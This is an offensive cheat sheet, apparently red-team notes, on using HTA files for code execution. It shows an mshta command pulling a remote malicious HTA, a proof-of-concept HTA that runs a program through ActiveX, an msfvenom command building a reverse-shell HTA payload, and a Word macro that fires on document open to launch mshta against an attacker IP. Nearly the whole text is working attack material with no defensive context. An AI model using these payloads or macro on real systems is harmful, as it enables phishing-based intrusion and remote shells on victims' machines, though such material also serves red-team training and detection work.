### From mshta.exe

```
mshta.exe http://malicious_remoteserver/malware.hta
```
 
### Normal Poc.hta
```
<html>
<head>
  <script>
    var payload = 'calc.exe';
    new ActiveXObject('Wscript.Shell').Run(payload);
  </script>
</head>

<body>
  <h1>Poc </h1>
  <script>
    self.close();
  </script>
</body>
</html> 
```

### Generate msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.134 LPORT=4444 -t hta-psh -o shell.hta
```

### HTA with Macro
```
Sub AutoOpen()
 ExecuteHTA
End Sub

Sub Document_Open()
 ExecuteHTA
End Sub

Sub ExecuteHTA()
 Dim url As String
 Dim command As String
 url = "http://192.168.2.134/shell.hta"
 command = "mshta.exe " & url
 Shell command, vbNormalFocus
End Sub
```
